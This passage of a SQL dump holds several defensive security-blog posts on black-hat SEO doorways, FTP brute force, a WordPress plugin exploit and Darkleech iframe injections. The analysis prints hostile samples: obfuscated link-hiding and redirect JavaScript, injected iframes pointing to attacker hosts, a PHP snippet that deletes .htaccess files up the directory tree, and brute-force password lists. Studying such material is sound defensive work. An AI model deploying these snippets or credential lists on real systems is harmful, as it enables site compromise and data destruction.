good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (110, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (111, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (112, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (113, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (114, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 